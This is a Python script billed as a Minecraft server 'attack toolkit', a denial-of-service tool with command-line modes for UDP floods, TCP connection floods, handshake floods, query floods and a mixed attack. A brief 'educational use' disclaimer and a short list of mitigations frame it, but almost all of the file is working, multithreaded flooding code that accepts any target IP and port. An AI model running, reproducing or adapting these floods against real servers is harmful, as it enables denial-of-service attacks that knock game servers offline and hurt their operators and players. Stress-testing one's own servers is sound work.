#!/usr/bin/env python3
"""
Minecraft Server Attack Toolkit - Layer 7
Educational tool for testing Minecraft server resilience.
Use only on your own authorized systems.
"""

import warnings
warnings.filterwarnings('ignore', category=FutureWarning)
warnings.filterwarnings('ignore', category=DeprecationWarning)
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

import socket
import sys
import threading
import time
import random
import struct
from datetime import datetime

RED = '\033[91m'
GRAY = '\033[90m'
RESET = '\033[0m'

def print_banner():
    print(f"{RED}+{'='*78}+{RESET}")
    print(f"{RED}|{RESET} {RED}MINECRAFT SERVER TOOLKIT{RESET} {GRAY}| Educational Use Only{RESET}                    {RED}|{RESET}")
    print(f"{RED}+{'='*78}+{RESET}")
    print()

def create_handshake_packet(host, port, protocol_version=47):
    """Create Minecraft handshake packet"""
    host_bytes = host.encode('utf-8')
    packet = bytearray()
    
    # Packet ID (Handshake = 0x00)
    packet.append(0x00)
    
    # Protocol Version
    packet.extend(struct.pack('>I', protocol_version))
    
    # Host length (VarInt)
    host_len = len(host_bytes)
    if host_len < 128:
        packet.append(host_len)
    else:
        packet.append((host_len & 0x7F) | 0x80)
        packet.append((host_len >> 7) & 0x7F)
    
    # Host
    packet.extend(host_bytes)
    
    # Port
    packet.extend(struct.pack('>H', port))
    
    # Next State (Status = 1)
    packet.append(0x01)
    
    # Packet length (VarInt)
    packet_len = len(packet)
    final_packet = bytearray()
    if packet_len < 128:
        final_packet.append(packet_len)
    else:
        final_packet.append((packet_len & 0x7F) | 0x80)
        final_packet.append((packet_len >> 7) & 0x7F)
    
    final_packet.extend(packet)
    return bytes(final_packet)

def create_query_packet():
    """Create Minecraft query packet"""
    packet = bytearray()
    packet.append(0xFE)  # Magic byte
    packet.append(0x01)  # Handshake
    packet.append(0xFA)  # Server list ping
    return bytes(packet)

def udp_flood_attack(target_ip, target_port, duration, threads, packet_size):
    """UDP flood attack on Minecraft server"""
    print(f"{RED}[ATTACK]{RESET} {GRAY}UDP Flood Attack{RESET}")
    print()
    print(f"{RED}[TARGET]{RESET} {GRAY}{target_ip}:{target_port}{RESET}")
    print(f"{RED}[DURATION]{RESET} {GRAY}{duration}s{RESET}")
    print(f"{RED}[THREADS]{RESET} {GRAY}{threads}{RESET}")
    print(f"{RED}[PACKET SIZE]{RESET} {GRAY}{packet_size} bytes{RESET}")
    print()

    packet_count = 0
    lock = threading.Lock()
    data = b'\x00' * packet_size

    def send_packets():
        nonlocal packet_count
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1)
            while True:
                try:
                    sock.sendto(data, (target_ip, target_port))
                    with lock:
                        packet_count += 1
                except:
                    pass
        except:
            pass

    start_time = time.time()
    active_threads = []

    print(f"{RED}[STARTING]{RESET} {GRAY}Launching {threads} threads...{RESET}")
    for _ in range(threads):
        t = threading.Thread(target=send_packets)
        t.daemon = True
        t.start()
        active_threads.append(t)

    try:
        while (time.time() - start_time) < duration:
            elapsed = time.time() - start_time
            with lock:
                current_packets = packet_count
            packets_per_sec = current_packets / elapsed if elapsed > 0 else 0
            progress = elapsed / duration

            bar_length = 30
            filled = int(bar_length * progress)
            bar = '#' * filled + '-' * (bar_length - filled)

            print(f"\r[{bar}] {progress:.1%} | Packets: {current_packets} | PPS: {packets_per_sec:.0f}", end='')
            time.sleep(0.1)
    except KeyboardInterrupt:
        print(f"\n{RED}[INTERRUPT]{RESET} {GRAY}Attack stopped by user{RESET}")

    for t in active_threads:
        t.join(timeout=0.1)

    print()
    print()
    print(f"{RED}[COMPLETE]{RESET} {GRAY}Attack finished{RESET}")
    print(f"{RED}[STATS]{RESET} {GRAY}Total packets sent: {packet_count}{RESET}")
    print()

def tcp_connection_flood(target_ip, target_port, duration, threads):
    """TCP connection flood on Minecraft server"""
    print(f"{RED}[ATTACK]{RESET} {GRAY}TCP Connection Flood{RESET}")
    print()
    print(f"{RED}[TARGET]{RESET} {GRAY}{target_ip}:{target_port}{RESET}")
    print(f"{RED}[DURATION]{RESET} {GRAY}{duration}s{RESET}")
    print(f"{RED}[THREADS]{RESET} {GRAY}{threads}{RESET}")
    print()

    connection_count = 0
    lock = threading.Lock()

    def create_connections():
        nonlocal connection_count
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((target_ip, target_port))
                with lock:
                    connection_count += 1
                time.sleep(0.1)
            except:
                pass

    start_time = time.time()
    active_threads = []

    print(f"{RED}[STARTING]{RESET} {GRAY}Launching {threads} threads...{RESET}")
    for _ in range(threads):
        t = threading.Thread(target=create_connections)
        t.daemon = True
        t.start()
        active_threads.append(t)

    try:
        while (time.time() - start_time) < duration:
            elapsed = time.time() - start_time
            with lock:
                current_connections = connection_count
            connections_per_sec = current_connections / elapsed if elapsed > 0 else 0
            progress = elapsed / duration

            bar_length = 30
            filled = int(bar_length * progress)
            bar = '#' * filled + '-' * (bar_length - filled)

            print(f"\r[{bar}] {progress:.1%} | Connections: {current_connections} | CPS: {connections_per_sec:.0f}", end='')
            time.sleep(0.1)
    except KeyboardInterrupt:
        print(f"\n{RED}[INTERRUPT]{RESET} {GRAY}Attack stopped by user{RESET}")

    for t in active_threads:
        t.join(timeout=0.1)

    print()
    print()
    print(f"{RED}[COMPLETE]{RESET} {GRAY}Attack finished{RESET}")
    print(f"{RED}[STATS]{RESET} {GRAY}Total connections: {connection_count}{RESET}")
    print()

def protocol_handshake_flood(target_ip, target_port, duration, threads):
    """Minecraft protocol handshake flood"""
    print(f"{RED}[ATTACK]{RESET} {GRAY}Protocol Handshake Flood{RESET}")
    print()
    print(f"{RED}[TARGET]{RESET} {GRAY}{target_ip}:{target_port}{RESET}")
    print(f"{RED}[DURATION]{RESET} {GRAY}{duration}s{RESET}")
    print(f"{RED}[THREADS]{RESET} {GRAY}{threads}{RESET}")
    print()

    handshake_count = 0
    lock = threading.Lock()
    handshake_packet = create_handshake_packet(target_ip, target_port)

    def send_handshakes():
        nonlocal handshake_count
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target_ip, target_port))
                sock.send(handshake_packet)
                with lock:
                    handshake_count += 1
                sock.close()
            except:
                pass

    start_time = time.time()
    active_threads = []

    print(f"{RED}[STARTING]{RESET} {GRAY}Launching {threads} threads...{RESET}")
    for _ in range(threads):
        t = threading.Thread(target=send_handshakes)
        t.daemon = True
        t.start()
        active_threads.append(t)

    try:
        while (time.time() - start_time) < duration:
            elapsed = time.time() - start_time
            with lock:
                current_handshakes = handshake_count
            handshakes_per_sec = current_handshakes / elapsed if elapsed > 0 else 0
            progress = elapsed / duration

            bar_length = 30
            filled = int(bar_length * progress)
            bar = '#' * filled + '-' * (bar_length - filled)

            print(f"\r[{bar}] {progress:.1%} | Handshakes: {current_handshakes} | HPS: {handshakes_per_sec:.0f}", end='')
            time.sleep(0.1)
    except KeyboardInterrupt:
        print(f"\n{RED}[INTERRUPT]{RESET} {GRAY}Attack stopped by user{RESET}")

    for t in active_threads:
        t.join(timeout=0.1)

    print()
    print()
    print(f"{RED}[COMPLETE]{RESET} {GRAY}Attack finished{RESET}")
    print(f"{RED}[STATS]{RESET} {GRAY}Total handshakes: {handshake_count}{RESET}")
    print()

def query_flood(target_ip, target_port, duration, threads):
    """Minecraft query protocol flood"""
    print(f"{RED}[ATTACK]{RESET} {GRAY}Query Protocol Flood{RESET}")
    print()
    print(f"{RED}[TARGET]{RESET} {GRAY}{target_ip}:{target_port}{RESET}")
    print(f"{RED}[DURATION]{RESET} {GRAY}{duration}s{RESET}")
    print(f"{RED}[THREADS]{RESET} {GRAY}{threads}{RESET}")
    print()

    query_count = 0
    lock = threading.Lock()
    query_packet = create_query_packet()

    def send_queries():
        nonlocal query_count
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1)
            while True:
                try:
                    sock.sendto(query_packet, (target_ip, target_port))
                    with lock:
                        query_count += 1
                except:
                    pass
        except:
            pass

    start_time = time.time()
    active_threads = []

    print(f"{RED}[STARTING]{RESET} {GRAY}Launching {threads} threads...{RESET}")
    for _ in range(threads):
        t = threading.Thread(target=send_queries)
        t.daemon = True
        t.start()
        active_threads.append(t)

    try:
        while (time.time() - start_time) < duration:
            elapsed = time.time() - start_time
            with lock:
                current_queries = query_count
            queries_per_sec = current_queries / elapsed if elapsed > 0 else 0
            progress = elapsed / duration

            bar_length = 30
            filled = int(bar_length * progress)
            bar = '#' * filled + '-' * (bar_length - filled)

            print(f"\r[{bar}] {progress:.1%} | Queries: {current_queries} | QPS: {queries_per_sec:.0f}", end='')
            time.sleep(0.1)
    except KeyboardInterrupt:
        print(f"\n{RED}[INTERRUPT]{RESET} {GRAY}Attack stopped by user{RESET}")

    for t in active_threads:
        t.join(timeout=0.1)

    print()
    print()
    print(f"{RED}[COMPLETE]{RESET} {GRAY}Attack finished{RESET}")
    print(f"{RED}[STATS]{RESET} {GRAY}Total queries: {query_count}{RESET}")
    print()

def mixed_attack(target_ip, target_port, duration, threads):
    """Mixed attack combining multiple methods"""
    print(f"{RED}[ATTACK]{RESET} {GRAY}Mixed Attack (UDP + TCP + Protocol){RESET}")
    print()
    print(f"{RED}[TARGET]{RESET} {GRAY}{target_ip}:{target_port}{RESET}")
    print(f"{RED}[DURATION]{RESET} {GRAY}{duration}s{RESET}")
    print(f"{RED}[THREADS]{RESET} {GRAY}{threads}{RESET}")
    print()

    stats = {
        'udp': 0,
        'tcp': 0,
        'protocol': 0
    }
    lock = threading.Lock()
    handshake_packet = create_handshake_packet(target_ip, target_port)
    udp_data = b'\x00' * 1024

    def udp_worker():
        nonlocal stats
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1)
            while True:
                try:
                    sock.sendto(udp_data, (target_ip, target_port))
                    with lock:
                        stats['udp'] += 1
                except:
                    pass
        except:
            pass

    def tcp_worker():
        nonlocal stats
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target_ip, target_port))
                with lock:
                    stats['tcp'] += 1
                time.sleep(0.05)
            except:
                pass

    def protocol_worker():
        nonlocal stats
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target_ip, target_port))
                sock.send(handshake_packet)
                with lock:
                    stats['protocol'] += 1
                sock.close()
            except:
                pass

    start_time = time.time()
    active_threads = []

    threads_per_method = threads // 3

    print(f"{RED}[STARTING]{RESET} {GRAY}Launching mixed attack...{RESET}")
    for _ in range(threads_per_method):
        t = threading.Thread(target=udp_worker)
        t.daemon = True
        t.start()
        active_threads.append(t)

    for _ in range(threads_per_method):
        t = threading.Thread(target=tcp_worker)
        t.daemon = True
        t.start()
        active_threads.append(t)

    for _ in range(threads_per_method):
        t = threading.Thread(target=protocol_worker)
        t.daemon = True
        t.start()
        active_threads.append(t)

    try:
        while (time.time() - start_time) < duration:
            elapsed = time.time() - start_time
            with lock:
                current_stats = stats.copy()
            total = sum(current_stats.values())
            total_per_sec = total / elapsed if elapsed > 0 else 0
            progress = elapsed / duration

            bar_length = 30
            filled = int(bar_length * progress)
            bar = '#' * filled + '-' * (bar_length - filled)

            print(f"\r[{bar}] {progress:.1%} | Total: {total} | TPS: {total_per_sec:.0f} | UDP: {current_stats['udp']} | TCP: {current_stats['tcp']} | Proto: {current_stats['protocol']}", end='')
            time.sleep(0.1)
    except KeyboardInterrupt:
        print(f"\n{RED}[INTERRUPT]{RESET} {GRAY}Attack stopped by user{RESET}")

    for t in active_threads:
        t.join(timeout=0.1)

    print()
    print()
    print(f"{RED}[COMPLETE]{RESET} {GRAY}Attack finished{RESET}")
    print(f"{RED}[STATS]{RESET}")
    print(f"{GRAY}|-{RESET} UDP Packets: {stats['udp']}")
    print(f"{GRAY}|-{RESET} TCP Connections: {stats['tcp']}")
    print(f"{GRAY}|-{RESET} Protocol Handshakes: {stats['protocol']}")
    print(f"{GRAY}|-{RESET} Total: {sum(stats.values())}")
    print()

def server_info(target_ip, target_port):
    """Get Minecraft server information"""
    print(f"{RED}[INFO]{RESET} {GRAY}Minecraft Server Information{RESET}")
    print()
    print(f"{RED}[TARGET]{RESET} {GRAY}{target_ip}:{target_port}{RESET}")
    print()

    print(f"{RED}[PROTOCOL INFO]{RESET}")
    print(f"{GRAY}|-{RESET} Default Port: {GRAY}25565{RESET}")
    print(f"{GRAY}|-{RESET} Protocol: {GRAY}TCP/UDP{RESET}")
    print(f"{GRAY}|-{RESET} Query Port: {GRAY}25565 (usually same){RESET}")
    print(f"{GRAY}|-{RESET} RCON Port: {GRAY}25575 (if enabled){RESET}")
    print()

    print(f"{RED}[VULNERABILITIES]{RESET}")
    print(f"{GRAY}|-{RESET} Query protocol can be flooded")
    print(f"{GRAY}|-{RESET} Handshake flooding exhausts resources")
    print(f"{GRAY}|-{RESET} UDP packets cause bandwidth issues")
    print(f"{GRAY}|-{RESET} TCP connection floods open socket limits")
    print()

    print(f"{RED}[MITIGATION]{RESET}")
    print(f"{GRAY}|-{RESET} Enable query.enable=false in server.properties")
    print(f"{GRAY}|-{RESET} Use firewall to rate-limit connections")
    print(f"{GRAY}|-{RESET} Implement connection throttling")
    print(f"{GRAY}|-{RESET} Use VPN/proxy protection")
    print()

def main():
    if len(sys.argv) < 2:
        print_banner()
        print(f"{RED}[USAGE]{RESET} {GRAY}python minecraft_toolkit.py <command> [args]{RESET}")
        print()
        print(f"{RED}[COMMANDS]{RESET}")
        print(f"{GRAY}|-{RESET} udp <ip> <port> <duration> <threads> <packet_size>")
        print(f"{GRAY}|-{RESET} tcp <ip> <port> <duration> <threads>")
        print(f"{GRAY}|-{RESET} protocol <ip> <port> <duration> <threads>")
        print(f"{GRAY}|-{RESET} query <ip> <port> <duration> <threads>")
        print(f"{GRAY}|-{RESET} mixed <ip> <port> <duration> <threads>")
        print(f"{GRAY}|-{RESET} info <ip> <port>")
        print()
        print(f"{RED}[EXAMPLES]{RESET}")
        print(f"{GRAY}|-{RESET} python minecraft_toolkit.py udp 192.168.1.1 25565 30 50 1024")
        print(f"{GRAY}|-{RESET} python minecraft_toolkit.py tcp 192.168.1.1 25565 30 50")
        print(f"{GRAY}|-{RESET} python minecraft_toolkit.py protocol 192.168.1.1 25565 30 50")
        print(f"{GRAY}|-{RESET} python minecraft_toolkit.py mixed 192.168.1.1 25565 30 100")
        print(f"{GRAY}|-{RESET} python minecraft_toolkit.py info 192.168.1.1 25565")
        print()
        return

    command = sys.argv[1].lower()

    if command == "udp":
        if len(sys.argv) < 6:
            print(f"{RED}[ERROR]{RESET} {GRAY}Usage: udp <ip> <port> <duration> <threads> <packet_size>{RESET}")
            return
        ip = sys.argv[2]
        port = int(sys.argv[3])
        duration = int(sys.argv[4])
        threads = int(sys.argv[5])
        packet_size = int(sys.argv[6]) if len(sys.argv) > 6 else 1024
        print_banner()
        udp_flood_attack(ip, port, duration, threads, packet_size)

    elif command == "tcp":
        if len(sys.argv) < 5:
            print(f"{RED}[ERROR]{RESET} {GRAY}Usage: tcp <ip> <port> <duration> <threads>{RESET}")
            return
        ip = sys.argv[2]
        port = int(sys.argv[3])
        duration = int(sys.argv[4])
        threads = int(sys.argv[5])
        print_banner()
        tcp_connection_flood(ip, port, duration, threads)

    elif command == "protocol":
        if len(sys.argv) < 5:
            print(f"{RED}[ERROR]{RESET} {GRAY}Usage: protocol <ip> <port> <duration> <threads>{RESET}")
            return
        ip = sys.argv[2]
        port = int(sys.argv[3])
        duration = int(sys.argv[4])
        threads = int(sys.argv[5])
        print_banner()
        protocol_handshake_flood(ip, port, duration, threads)

    elif command == "query":
        if len(sys.argv) < 5:
            print(f"{RED}[ERROR]{RESET} {GRAY}Usage: query <ip> <port> <duration> <threads>{RESET}")
            return
        ip = sys.argv[2]
        port = int(sys.argv[3])
        duration = int(sys.argv[4])
        threads = int(sys.argv[5])
        print_banner()
        query_flood(ip, port, duration, threads)

    elif command == "mixed":
        if len(sys.argv) < 5:
            print(f"{RED}[ERROR]{RESET} {GRAY}Usage: mixed <ip> <port> <duration> <threads>{RESET}")
            return
        ip = sys.argv[2]
        port = int(sys.argv[3])
        duration = int(sys.argv[4])
        threads = int(sys.argv[5])
        print_banner()
        mixed_attack(ip, port, duration, threads)

    elif command == "info":
        if len(sys.argv) < 3:
            print(f"{RED}[ERROR]{RESET} {GRAY}Usage: info <ip> <port>{RESET}")
            return
        ip = sys.argv[2]
        port = int(sys.argv[3])
        print_banner()
        server_info(ip, port)

    else:
        print(f"{RED}[ERROR]{RESET} {GRAY}Unknown command: {command}{RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{RED}[INTERRUPT]{RESET} {GRAY}Operation cancelled{RESET}")
        sys.exit(0)
